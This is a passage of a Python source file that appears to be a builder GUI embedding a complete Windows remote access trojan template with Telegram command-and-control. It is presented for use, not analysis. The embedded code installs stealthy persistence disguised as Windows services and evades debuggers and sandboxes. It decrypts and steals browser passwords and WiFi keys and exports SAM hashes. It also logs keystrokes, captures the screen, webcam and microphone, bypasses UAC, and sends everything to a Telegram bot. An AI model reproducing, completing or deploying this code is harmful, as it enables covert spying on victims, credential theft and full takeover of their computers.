import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import subprocess
import os
import sys
import shutil
import tempfile
import threading
import random

# ----------------------------------------------------------------------
# FULL RAT SCRIPT (V6.9 – cross‑platform, all commands)
# Same template as before – hardcoded to avoid external file.
# ----------------------------------------------------------------------
RAT_TEMPLATE = r'''
"""
Windows Service RAT with Telegram C2 - V6.9 (System Control)
Built with Builder GUI – Encrypted at rest
"""
import sys
import os
import time
import subprocess
import json
import base64
import sqlite3
import winreg
import ctypes
import ctypes.wintypes
import threading
import tempfile
import shutil
import random
import hashlib
import uuid
import socket
import struct
import re
from datetime import datetime
from pathlib import Path

# Windows service imports
import win32serviceutil
import win32service
import win32event
import servicemanager
import win32api
import win32con
import win32security
import win32file
import win32process
import win32gui
import win32ui

# Third-party imports
import requests
import psutil
from PIL import ImageGrab
import cv2
import numpy as np
import sounddevice as sd
import scipy.io.wavfile as wavfile
import pyperclip
from pynput import keyboard
import winsound
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

try:
    import nss
    import nss.nss
    FIREFOX_SUPPORT = True
except ImportError:
    FIREFOX_SUPPORT = False

# ----------------------------------------------------------------------
# HARDCODED CONFIGURATION (inserted by builder)
# ----------------------------------------------------------------------
BOT_TOKEN = "__BOT_TOKEN__"
CHAT_ID = "__CHAT_ID__"
AUTHORIZED_ID = __AUTHORIZED_ID__

# ----------------------------------------------------------------------
# SERVICE NAME PERSISTENCE
# ----------------------------------------------------------------------
def get_hardware_id():
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography") as key:
            guid, _ = winreg.QueryValueEx(key, "MachineGuid")
            return guid.encode()
    except:
        return uuid.getnode().to_bytes(6, 'big')

def get_persistent_service_name():
    reg_path = r"Software\RAT_ServiceName"
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
            name, _ = winreg.QueryValueEx(key, "ServiceName")
            return name
    except FileNotFoundError:
        hw = get_hardware_id()
        h = hashlib.sha256(hw).hexdigest()[:8]
        prefixes = ["Windows", "Microsoft", "Network", "Security", "Update", "System", "Application"]
        suffixes = ["Svc", "Service", "Provider", "Manager"]
        rnd = int(h[:4], 16) % len(prefixes)
        rnd2 = int(h[4:8], 16) % len(suffixes)
        name = f"{prefixes[rnd]}{h}{suffixes[rnd2]}"
        try:
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
                winreg.SetValueEx(key, "ServiceName", 0, winreg.REG_SZ, name)
        except:
            pass
        return name

SERVICE_NAME = get_persistent_service_name()
SERVICE_DISPLAY_NAME = f"{random.choice(['Windows', 'Microsoft'])} {random.choice(['Update', 'Security', 'Network'])} Service"

# ----------------------------------------------------------------------
# REGISTRY HIVE MAP
# ----------------------------------------------------------------------
HIVE_MAP = {
    "HKEY_CLASSES_ROOT": winreg.HKEY_CLASSES_ROOT,
    "HKEY_CURRENT_USER": winreg.HKEY_CURRENT_USER,
    "HKEY_LOCAL_MACHINE": winreg.HKEY_LOCAL_MACHINE,
    "HKEY_USERS": winreg.HKEY_USERS,
    "HKEY_CURRENT_CONFIG": winreg.HKEY_CURRENT_CONFIG,
}

# ----------------------------------------------------------------------
# PERSISTENCE & STEALTH
# ----------------------------------------------------------------------
def install_persistence(exe_path=None):
    if exe_path is None:
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = sys.executable + " " + __file__
    try:
        win32serviceutil.InstallService(
            pythonClassString="__main__.Service",
            serviceName=SERVICE_NAME,
            displayName=SERVICE_DISPLAY_NAME,
            startType=win32service.SERVICE_AUTO_START,
            description="Provides core system maintenance."
        )
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.SetValueEx(regkey, SERVICE_NAME, 0, winreg.REG_SZ, exe_path)
        task_name = f"Microsoft\{SERVICE_NAME}"
        cmd_system = f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc onlogon /ru SYSTEM /f'
        result = subprocess.run(cmd_system, shell=True, capture_output=True)
        if result.returncode != 0:
            cmd_user = f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc onlogon /f'
            subprocess.run(cmd_user, shell=True, capture_output=True)
        startup = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        if os.path.exists(startup):
            shutil.copy2(exe_path, os.path.join(startup, os.path.basename(exe_path)))
    except Exception:
        pass

def remove_persistence():
    try:
        win32serviceutil.RemoveService(SERVICE_NAME)
    except:
        pass
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.DeleteValue(regkey, SERVICE_NAME)
    except:
        pass
    try:
        task_name = f"Microsoft\{SERVICE_NAME}"
        subprocess.run(f'schtasks /delete /tn "{task_name}" /f', shell=True, capture_output=True)
    except:
        pass
    try:
        startup = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        if os.path.exists(startup):
            for f in os.listdir(startup):
                if SERVICE_NAME in f:
                    os.remove(os.path.join(startup, f))
    except:
        pass

def hide_console():
    if sys.platform == 'win32':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def is_debugger_present():
    debuggers = ["ollydbg", "x64dbg", "x32dbg", "windbg", "ida", "cheat engine", "processhacker", "procexp"]
    try:
        for proc in psutil.process_iter(['name']):
            name = proc.info['name'].lower()
            for d in debuggers:
                if d in name:
                    return True
    except:
        pass
    return False

def get_active_window_title():
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        if length == 0:
            return "[No window]"
        buffer = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buffer, length + 1)
        return buffer.value
    except:
        return "[Unknown]"

# ----------------------------------------------------------------------
# SANDBOX / ANALYSIS DETECTION
# ----------------------------------------------------------------------
def is_sandbox():
    try:
        disk = psutil.disk_usage('C:\\')
        if disk.total < 60 * 1024**3:
            return True
    except:
        pass
    try:
        if psutil.cpu_count(logical=False) < 2:
            return True
    except:
        pass
    sandbox_procs = ['vmtoolsd', 'vmsrvc', 'procmon', 'wireshark', 'olydbg', 'x64dbg']
    try:
        for proc in psutil.process_iter(['name']):
            name = proc.info['name'].lower()
            for s in sandbox_procs:
                if s in name:
                    return True
    except:
        pass
    return False

# ----------------------------------------------------------------------
# MUTEX
# ----------------------------------------------------------------------
def create_mutex():
    mutex_name = f"Global\RAT-{hashlib.md5(get_hardware_id()).hexdigest()[:8]}"
    try:
        mutex = win32event.CreateMutex(None, False, mutex_name)
        if win32api.GetLastError() == win32event.ERROR_ALREADY_EXISTS:
            return False
        return True
    except:
        return True

# ----------------------------------------------------------------------
# DPAPI HELPERS
# ----------------------------------------------------------------------
class DATA_BLOB(ctypes.Structure):
    _fields_ = [
        ('cbData', ctypes.wintypes.DWORD),
        ('pbData', ctypes.POINTER(ctypes.c_char))
    ]

def decrypt_dpapi(encrypted_data):
    crypt32 = ctypes.windll.crypt32
    kernel32 = ctypes.windll.kernel32

    p_in_blob = DATA_BLOB()
    p_in_blob.cbData = len(encrypted_data)
    buf = ctypes.create_string_buffer(encrypted_data, len(encrypted_data))
    p_in_blob.pbData = ctypes.cast(buf, ctypes.POINTER(ctypes.c_char))

    p_out_blob = DATA_BLOB()
    p_out_blob.cbData = 0
    p_out_blob.pbData = None

    if crypt32.CryptUnprotectData(
        ctypes.byref(p_in_blob),
        None,
        None,
        None,
        None,
        0,
        ctypes.byref(p_out_blob)
    ):
        decrypted = ctypes.string_at(p_out_blob.pbData, p_out_blob.cbData)
        kernel32.LocalFree(p_out_blob.pbData)
        return decrypted
    return None

# ----------------------------------------------------------------------
# CHROME AES-GCM
# ----------------------------------------------------------------------
def get_chrome_aes_key():
    local_state = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Local State")
    if not os.path.exists(local_state):
        return None
    try:
        with open(local_state, 'r', encoding='utf-8') as f:
            data = json.load(f)
        enc_key_b64 = data.get('os_crypt', {}).get('encrypted_key')
        if not enc_key_b64:
            return None
        enc_key = base64.b64decode(enc_key_b64)
        if enc_key.startswith(b'DPAPI'):
            enc_key = enc_key[5:]
        return decrypt_dpapi(enc_key)
    except:
        return None

def decrypt_chrome_password(encrypted_blob, aes_key):
    decrypted = decrypt_dpapi(encrypted_blob)
    if decrypted is not None:
        return decrypted
    if aes_key is None:
        return None
    if encrypted_blob.startswith(b'v10') or encrypted_blob.startswith(b'v11'):
        encrypted_blob = encrypted_blob[3:]
        nonce = encrypted_blob[:12]
        ciphertext_and_tag = encrypted_blob[12:]
        if len(ciphertext_and_tag) < 16:
            return None
        tag = ciphertext_and_tag[-16:]
        ciphertext = ciphertext_and_tag[:-16]
        aesgcm = AESGCM(aes_key)
        try:
            return aesgcm.decrypt(nonce, ciphertext + tag, None)
        except:
            return None
    if len(encrypted_blob) > 28:
        nonce = encrypted_blob[:12]
        ciphertext_and_tag = encrypted_blob[12:]
        if len(ciphertext_and_tag) < 16:
            return None
        tag = ciphertext_and_tag[-16:]
        ciphertext = ciphertext_and_tag[:-16]
        aesgcm = AESGCM(aes_key)
        try:
            return aesgcm.decrypt(nonce, ciphertext + tag, None)
        except:
            return None
    return None

# ----------------------------------------------------------------------
# BROWSER EXTRACTION HELPERS
# ----------------------------------------------------------------------
def extract_browser_passwords(browser_path, aes_key):
    if not os.path.exists(browser_path):
        return []
    profiles = []
    for item in os.listdir(browser_path):
        if item == "Default" or item.startswith("Profile "):
            login_db = os.path.join(browser_path, item, "Login Data")
            if os.path.exists(login_db):
                profiles.append((item, login_db))
    results = []
    for profile_name, db_path in profiles:
        temp_db = tempfile.NamedTemporaryFile(suffix='.db', delete=False)
        temp_db.close()
        shutil.copy2(db_path, temp_db.name)
        conn = sqlite3.connect(temp_db.name)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        rows = cursor.fetchall()
        conn.close()
        os.unlink(temp_db.name)
        for url, username, encrypted_pw in rows:
            decrypted = decrypt_chrome_password(encrypted_pw, aes_key)
            if decrypted is None:
                pw = "[decryption failed]"
            else:
                try:
                    pw = decrypted.decode('utf-16le').rstrip('\x00')
                except:
                    pw = decrypted.decode('utf-8', errors='ignore')
            results.append((url, username, pw))
    return results

# ----------------------------------------------------------------------
# FIREFOX HELPERS (stub)
# ----------------------------------------------------------------------
def get_firefox_credentials(profile_path):
    return []

# ----------------------------------------------------------------------
# COMMAND HELP
# ----------------------------------------------------------------------
COMMAND_HELP = {
    "cmd": "Execute a system command.",
    "shell": "Alias for /cmd.",
    "upload": "Upload a file to Telegram.",
    "download": "Download a file from URL to target.",
    "ls": "List directory contents.",
    "cd": "Change working directory.",
    "pwd": "Print current directory.",
    "screenshot": "Take a screenshot and send.",
    "webcam": "Capture webcam image.",
    "mic": "Record audio (default 5s).",
    "clipboard": "Get clipboard text.",
    "keys": "Start keylogger.",
    "keys_stop": "Stop keylogger and send logs.",
    "persist": "Install persistence (service + run + task).",
    "unpersist": "Remove all persistence.",
    "processes": "List running processes.",
    "kill": "Terminate process by PID.",
    "start": "Launch a process.",
    "reg_query": "Read registry value.",
    "reg_set": "Write registry value.",
    "reg_delete": "Delete registry value.",
    "wifi": "Show saved WiFi passwords.",
    "browser": "Extract Chrome passwords (all profiles).",
    "firefox": "Extract Firefox passwords (requires nss).",
    "geolocate": "IP-based geolocation.",
    "sysinfo": "Basic system info.",
    "reboot": "Reboot the system.",
    "shutdown": "Shutdown the system.",
    "lock": "Lock workstation.",
    "message": "Show a message box.",
    "audio": "Play an audio file.",
    "screen_record": "Record screen (default 10s).",
    "port_forward": "Start a port forward.",
    "reverse_proxy": "Start a reverse shell relay.",
    "help": "Show this help.",
    "edge": "Extract Edge passwords.",
    "opera": "Extract Opera passwords.",
    "memscan": "Scan memory for a string pattern.",
    "netscan": "ARP scan local network.",
    "portscan": "TCP port scan on an IP.",
    "keylog_trigger": "Start keylogger with screenshot on trigger words.",
    "persist_full": "Install ALL persistence layers (service, run, task, startup).",
    "uac_bypass": "Attempt UAC bypass via fodhelper.",
    "dump_sam": "Dump SAM hashes (requires admin).",
    "sysinfo_ext": "Extended system info (software, hotfixes).",
    "clipboard_loop": "Start continuous clipboard logging.",
    "disable_defender": "Disable Windows Defender (registry + services).",
    "enable_rdp": "Enable Remote Desktop, open firewall, create admin user.",
    "firewall_add": "Add inbound firewall rule for a port.",
    "eventlog_clear": "Clear Windows event logs.",
    "powershell": "Run a PowerShell command.",
    "inject": "Inject MessageBox shellcode into a process by PID (stub).",
    "screenshot_loop": "Continuously send screenshots every N seconds.",
    "webcam_loop": "Continuously send webcam images every N seconds.",
    "mic_loop": "Continuously send audio chunks every N seconds.",
    "system_restore_disable": "Disable System Restore on C:.",
    "exit": "Stop the RAT.",
}

# ----------------------------------------------------------------------
# TELEGRAM C2 CLIENT
# ----------------------------------------------------------------------
class TelegramRAT:
    def __init__(self):
        self.bot_token = BOT_TOKEN
        self.chat_id = CHAT_ID
        self.authorized_id = AUTHORIZED_ID
        self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
        self.offset = 0
        self.current_dir = os.getcwd()
        self.keylogger_running = False
        self.keylog_buffer = []
        self.keylog_listener = None
        self.service_stop_event = None
        self.alive = True
        self.watchdog_thread = None
        self.last_heartbeat = time.time()
        self.trigger_words = []
        self.keylog_trigger_active = False
        self.clipboard_loop_running = False
        self.clipboard_thread = None
        self.loop_running = False
        self.loop_thread = None

        self.commands = {
            "cmd": self.cmd,
            "shell": self.cmd,
            "upload": self.upload,
            "download": self.download,
            "ls": self.ls,
            "cd": self.cd,
            "pwd": self.pwd,
            "screenshot": self.screenshot,
            "webcam": self.webcam,
            "mic": self.mic,
            "clipboard": self.clipboard,
            "keys": self.keys_start,
            "keys_stop": self.keys_stop,
            "persist": self.persist,
            "unpersist": self.unpersist,
            "processes": self.processes,
            "kill": self.kill,
            "start": self.start_proc,
            "reg_query": self.reg_query,
            "reg_set": self.reg_set,
            "reg_delete": self.reg_delete,
            "wifi": self.wifi,
            "browser": self.browser,
            "firefox": self.firefox,
            "geolocate": self.geolocate,
            "sysinfo": self.sysinfo,
            "reboot": self.reboot,
            "shutdown": self.shutdown,
            "lock": self.lock,
            "message": self.message,
            "audio": self.audio,
            "screen_record": self.screen_record,
            "port_forward": self.port_forward,
            "reverse_proxy": self.reverse_proxy,
            "help": self.help_cmd,
            "edge": self.edge,
            "opera": self.opera,
            "memscan": self.memscan,
            "netscan": self.netscan,
            "portscan": self.portscan,
            "keylog_trigger": self.keylog_trigger_start,
            "persist_full": self.persist_full,
            "uac_bypass": self.uac_bypass,
            "dump_sam": self.dump_sam,
            "sysinfo_ext": self.sysinfo_ext,
            "clipboard_loop": self.clipboard_loop_start,
            "disable_defender": self.disable_defender,
            "enable_rdp": self.enable_rdp,
            "firewall_add": self.firewall_add,
            "eventlog_clear": self.eventlog_clear,
            "powershell": self.powershell,
            "inject": self.inject,
            "screenshot_loop": self.screenshot_loop,
            "webcam_loop": self.webcam_loop,
            "mic_loop": self.mic_loop,
            "system_restore_disable": self.system_restore_disable,
            "exit": self.exit,
        }

    # ---- HELPERS ----
    def send_message(self, text):
        if not text:
            return
        url = f"{self.base_url}/sendMessage"
        chunk_size = 4096
        for i in range(0, len(text), chunk_size):
            chunk = text[i:i+chunk_size]
            payload = {"chat_id": self.chat_id, "text": chunk}
            try:
                requests.post(url, json=payload, timeout=10)
            except:
                pass
            time.sleep(0.2)

    def send_file(self, file_path, caption=""):
        url = f"{self.base_url}/sendDocument"
        try:
            with open(file_path, 'rb') as f:
                files = {'document': f}
                data = {'chat_id': self.chat_id, 'caption': caption}
                requests.post(url, data=data, files=files, timeout=30)
        except:
            pass

    def get_updates(self):
        url = f"{self.base_url}/getUpdates"
        params = {"offset": self.offset, "timeout": 20}
        try:
            resp = requests.get(url, params=params, timeout=25)
            if resp.status_code == 200:
                data = resp.json()
                if data['ok'] and data['result']:
                    updates = data['result']
                    self.offset = updates[-1]['update_id'] + 1
                    return updates
        except:
            pass
        return []

    # ---- COMMAND HANDLERS ----
    def cmd(self, args):
        try:
            result = subprocess.run(args, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout + result.stderr
            return output if output else "[Command executed successfully]"
        except subprocess.TimeoutExpired:
            return "[Command timed out]"
        except Exception as e:
            return f"[Error: {str(e)}]"

    def upload(self, args):
        if not args:
            return "[Usage: upload <file_path>]"
        path = args.strip()
        if not os.path.exists(path):
            return f"[File not found: {path}]"
        self.send_file(path, caption=f"Uploaded: {path}")
        return f"[File sent: {path}]"

    def download(self, args):
        parts = args.split()
        if len(parts) < 2:
            return "[Usage: download <url> <save_path>]"
        url, save_path = parts[0], parts[1]
        try:
            r = requests.get(url, timeout=30)
            with open(save_path, 'wb') as f:
                f.write(r.content)
            return f"[Downloaded to: {save_path}]"
        except Exception as e:
            return f"[Error: {str(e)}]"

    def ls(self, args):
        path = args.strip() if args else self.current_dir
        try:
            items = os.listdir(path)
            output = "\n".join(items) if items else "[Empty directory]"
            return output
        except Exception as e:
            return f"[Error: {str(e)}]"

    def cd(self, args):
        if not args:
            return "[Usage: cd <path>]"
        try:
            os.chdir(args.strip())
            self.current_dir = os.getcwd()
            return f"[Changed to: {self.current_dir}]"
        except Exception as e:
            return f"[Error: {str(e)}]"

    def pwd(self, args=None):
        return self.current_dir

    def screenshot(self, args=None):
        try:
            img = ImageGrab.grab()
            temp = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
            temp.close()
            img.save(temp.name)
            self.send_file(temp.name, caption="Screenshot")
            os.unlink(temp.name)
            return "[Screenshot sent]"
        except Exception as e:
            return f"[Error: {str(e)}]"

    def webcam(self, args=None):
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            if not ret:
                return "[Webcam not available]"
            temp = tempfile.NamedTemporaryFile(suffix='.jpg', delete=False)
            temp.close()
            cv2.imwrite(temp.name, frame)
            self.send_file(temp.name, caption="Webcam capture")
            os.unlink(temp.name)
            return "[Webcam sent]"
        except Exception as e:
            return f"[Error: {str(e)}]"

    def mic(self, args):
        duration = 5
        if args and args.strip().isdigit():
            duration = int(args.strip())
        try:
            sample_rate = 44100
            recording = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=1, dtype='int16')
            sd.wait()
            temp = tempfile.NamedTemporaryFile(suffix='.wav', delete=False)
            temp.close()
            wavfile.write(temp.name, sample_rate, recording)
            self.send_file(temp.name, caption=f"Audio {duration}s")
            os.unlink(temp.name)
            return "[Audio sent]"
        except Exception as e:
            return f"[Error: {str(e)}]"

    def clipboard(self, args=None):
        try:
            content = pyperclip.paste()
            return content if content else "[Clipboard empty]"
        except Exception as e:
            return f"[Error: {str(e)}]"

    def keys_start(self, args=None):
        if self.keylogger_running:
            return "[Keylogger already running]"
        self.keylogger_running = True
        self.keylog_buffer = []
        def on_press(key):
            try:
                self.keylog_buffer.append(key.char)
            except AttributeError:
                self.keylog_buffer.append(f"[{key}]")
        self.keylog_listener = keyboard.Listener(on_press=on_press)
        self.keylog_listener.daemon = True
        self.keylog_listener.start()
        return "[Keylogger started]"

    def keys_stop(self, args=None):
        if not self.keylogger_running:
            return "[Keylogger not running]"
        self.keylogger_running = False
        if self.keylog_listener:
            self.keylog_listener.stop()
        logs = ''.join(self.keylog_buffer) if self.keylog_buffer else "[No keys logged]"
        window = get_active_window_title()
        self.keylog_buffer = []
        return f"[Keylogger stopped] (Window: {window})\n{logs}"

    def persist(self, args=None):
        install_persistence()
        return "[Persistence enabled (service + run + task)]"

    def persist_full(self, args=None):
        install_persistence()
        return "[All persistence layers installed (service, run, task, startup folder)]"

    def unpersist(self, args=None):
        remove_persistence()
        return "[Persistence removed]"

    def processes(self, args=None):
        try:
            output = ""
            for proc in psutil.process_iter(['pid', 'name']):
                output += f"{proc.info['pid']}: {proc.info['name']}\n"
            return output if output else "[No processes]"
        except Exception as e:
            return f"[Error: {str(e)}]"

    def kill(self, args):
        if not args or not args.strip().isdigit():
            return "[Usage: kill <pid>]"
        pid = int(args.strip())
        try:
            proc = psutil.Process(pid)
            proc.kill()
            return f"[Process {pid} killed]"
        except Exception as e:
            return f"[Error: {str(e)}]"

    def start_proc(self, args):
        if not args:
            return "[Usage: start <command>]"
        try:
            subprocess.Popen(args.strip(), shell=True)
            return f"[Started: {args.strip()}]"
        except Exception as e:
            return f"[Error: {str(e)}]"

    def reg_query(self, args):
        if not args:
            return "[Usage: reg_query <hive\\key> <value>]"
        parts = args.split(' ', 1)
        if len(parts) < 2:
            return "[Invalid format]"
        key_path, value_name = parts[0], parts[1]
        try:
            hive_str, subkey = key_path.split('\\', 1)
            hive = HIVE_MAP.get(hive_str.upper())
            if not hive:
                return "[Invalid hive]"
            with winreg.OpenKey(hive, subkey) as key:
                val, _ = winreg.QueryValueEx(key, value_name)
                return f"{value_name}: {val}"
        except Exception as e:
            return f"[Error: {str(e)}]"

    def reg_set(self, args):
        parts = args.split(' ', 2)
        if len(parts) < 3:
            return "[Usage: reg_set <hive\\key> <value> <data>]"
        key_path, value_name, data = parts[0], parts[1], parts[2]
        try:
            hive_str, subkey = key_path.split('\\', 1)
            hive = HIVE_MAP.get(hive_str.upper())
            if not hive:
                return "[Invalid hive]"
            with winreg.OpenKey(hive, subkey, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, data)
            return f"[Set {value_name} = {data}]"
        except Exception as e:
            return f"[Error: {str(e)}]"

    def reg_delete(self, args):
        parts = args.split(' ', 1)
        if len(parts) < 2:
            return "[Usage: reg_delete <hive\\key> <value>]"
        key_path, value_name = parts[0], parts[1]
        try:
            hive_str, subkey = key_path.split('\\', 1)
            hive = HIVE_MAP.get(hive_str.upper())
            if not hive:
                return "[Invalid hive]"
            with winreg.OpenKey(hive, subkey, 0, winreg.KEY_SET_VALUE) as key:
                winreg.DeleteValue(key, value_name)
            return f"[Deleted {value_name}]"
        except Exception as e:
            return f"[Error: {str(e)}]"

    def wifi(self, args=None):
        try:
            profiles = subprocess.run('netsh wlan show profiles', shell=True, capture_output=True, text=True)
            output = []
            for line in profiles.stdout.split('\n'):
                if "All User Profile" in line:
                    name = line.split(':')[1].strip()
                    passwd = subprocess.run(f'netsh wlan show profile name="{name}" key=clear', shell=True, capture_output=True, text=True)
                    for p_line in passwd.stdout.split('\n'):
                        if "Key Content" in p_line:
                            output.append(f"{name}: {p_line.split(':')[1].strip()}")
            return "\n".join(output) if output else "[No WiFi passwords]"
        except Exception as e:
            return f"[Error: {str(e)}]"

    def browser(self, args=None):
        try:
            chrome_data = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data")
            if not os.path.exists(chrome_data):
                return "[Chrome not found]"
            aes_key = get_chrome_aes_key()
            results = extract_browser_passwords(chrome_data, aes_key)
            if not results:
                return "[No Chrome passwords found]"
            output = "=== Chrome ===\n"
            for url, user, pw in results:
                output += f"{url} | {user} | {pw}\n"
            return output
        except Exception as e:
            return f"[Error: {str(e)}]"

    def edge(self, args=None):
        try:
            edge_data = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data")
            if not os.path.exists(edge_data):
                return "[Edge not found]"
            aes_key = get_chrome_aes_key()
            results = extract_browser_passwords(edge_data, aes_key)
            if not results:
                return "[No Edge passwords found]"
            output = "=== Edge ===\n"
            for url, user, pw in results:
                output += f"{url} | {user} | {pw}\n"
            return output
        except Exception as e:
            return f"[Error: {str(e)}]"

    def opera(self, args=None):
        try:
            opera_data = os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera Stable")
            if not os.path.exists(opera_data):
                return "[Opera not found]"
            aes_key = get_chrome_aes_key()
            results = extract_browser_passwords(opera_data, aes_key)
            if not results:
                return "[No Opera passwords found]"
            output = "=== Opera ===\n"
            for url, user, pw in results:
                output += f"{url} | {user} | {pw}\n"
            return output
        except Exception as e:
            return f"[Error: {str(e)}]"

    def firefox(self, args=None):
        if not FIREFOX_SUPPORT:
            return "[Firefox support not installed (pip install nss)]"
        try:
            profiles_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
            if not os.path.exists(profiles_path):
                return "[Firefox not found]"
            output = ""
            for profile in os.listdir(profiles_path):
                profile_dir = os.path.join(profiles_path, profile)
                if not os.path.isdir(profile_dir):
                    continue
                logins = os.path.join(profile_dir, "logins.json")
                if not os.path.exists(logins):
                    continue
                with open(logins, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                if 'logins' not in data:
                    continue
                output += f"\n=== Profile: {profile} ===\n"
                for entry in data['logins']:
                    url = entry.get('hostname', '')
                    username = entry.get('username', '')
                    output += f"{url} | {username} | [encrypted]\n"
            return output if output else "[No Firefox passwords found]"
        except Exception as e:
            return f"[Error: {str(e)}]"

    def memscan(self, args):
        if not args:
            return "[Usage: memscan <pattern>]"
        pattern = args.strip().encode('utf-8', errors='ignore')
        results = []
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    for region in proc.memory_maps(grouped=False):
                        if 'r' in region.perms:
                            try:
                                mem = proc.read_memory(region.start, region.stop - region.start)
                                if pattern in mem:
                                    results.append(f"{proc.info['pid']} ({proc.info['name']}) - found at {hex(region.start)}")
                            except:
                                pass
                except:
                    pass
            if results:
                return "\n".join(results[:20])
            else:
                return "[Pattern not found in memory]"
        except Exception as e:
            return f"[Error: {str(e)}]"

    def netscan(self, args=None):
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            subnet = '.'.join(local_ip.split('.')[:3]) + '.'
            output = []
            for i in range(1, 255):
                ip = subnet + str(i)
                result = subprocess.run(f'ping -n 1 -w 100 {ip}', shell=True, capture_output=True)
                if result.returncode == 0:
                    arp = subprocess.run(f'arp -a {ip}', shell=True, capture_output=True, text=True)
                    for line in arp.stdout.split('\n'):
                        if ip in line and 'dynamic' in line:
                            parts = line.split()
                            if len(parts) >= 3:
                                mac = parts[1] if len(parts)>1 else ''
                                output.append(f"{ip} - {mac}")
                                break
            return "\n".join(output) if output else "[No hosts found]"
        except Exception as e:
            return f"[Error: {str(e)}]"

    def portscan(self, args):
        if not args:
            return "[Usage: portscan <ip>]"
        ip = args.strip()
        common_ports = [21,22,23,25,53,80,443,445,3389,8080]
        open_ports = []
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    open_ports.append(str(port))
                sock.close()
            except:
                pass
        return f"[Open ports: {', '.join(open_ports)}]" if open_ports else "[No common ports open]"

    def keylog_trigger_start(self, args):
        if not args:
            return "[Usage: keylog_trigger <word1,word2,...>]"
        self.trigger_words = [w.strip().lower() for w in args.split(',')]
        if not self.trigger_words:
            return "[No trigger words provided]"
        self.keylog_trigger_active = True
        self.keylog_buffer = []
        def on_press(key):
            try:
                if hasattr(key, 'char') and key.char:
                    self.keylog_buffer.append(key.char)
                    buffer_lower = ''.join(self.keylog_buffer).lower()
                    for word in self.trigger_words:
                        if word in buffer_lower:
                            img = ImageGrab.grab()
                            temp = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
                            temp.close()
                            img.save(temp.name)
                            self.send_file(temp.name, caption=f"[TRIGGER] {word} detected")
                            os.unlink(temp.name)
                            self.keylog_buffer.clear()
                            break
            except AttributeError:
                pass
        self.keylog_listener = keyboard.Listener(on_press=on_press)
        self.keylog_listener.daemon = True
        self.keylog_listener.start()
        return f"[Trigger keylogger started with words: {', '.join(self.trigger_words)}]"

    def uac_bypass(self, args=None):
        try:
            key_path = r"Software\Classes\ms-settings\shell\open\command"
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "cmd.exe /c start cmd.exe")
            subprocess.Popen("fodhelper.exe", shell=True)
            time.sleep(2)
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            return "[UAC bypass attempt via fodhelper executed (may require admin)]"
        except Exception as e:
            return f"[Error: {str(e)}]"

    def dump_sam(self, args=None):
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                return "[Admin required for SAM dump]"
            temp_dir = tempfile.gettempdir()
            sam_path = os.path.join(temp_dir, "sam")
            system_path = os.path.join(temp_dir, "system")
            subprocess.run(f'reg save HKLM\\SAM {sam_path}', shell=True, capture_output=True)
            subprocess.run(f'reg save HKLM\\SYSTEM {system_path}', shell=True, capture_output=True)
            self.send_file(sam_path, caption="SAM hive")
            self.send_file(system_path, caption="SYSTEM hive")
            os.remove(sam_path)
            os.remove(system_path)
            return "[SAM and SYSTEM hives dumped and sent]"
        except Exception as e:
            return f"[Error: {str(e)}]"

    def sysinfo_ext(self, args=None):
        try:
            import platform
            info = []
            info.append(f"Hostname: {platform.node()}")
            info.append(f"OS: {platform.system()} {platform.release()}")
            info.append(f"Arch: {platform.machine()}")
            info.append(f"CPU: {psutil.cpu_percent()}%")
            info.append(f"Memory: {psutil.virtual_memory().percent}%")
            info.append(f"Disk (C:): {psutil.disk_usage('C:\\').percent}%")
            uptime_seconds = time.time() - psutil.boot_time()
            days = int(uptime_seconds // 86400)
            hours = int((uptime_seconds % 86400) // 3600)
            info.append(f"Uptime: {days}d {hours}h")
            software = []
            try:
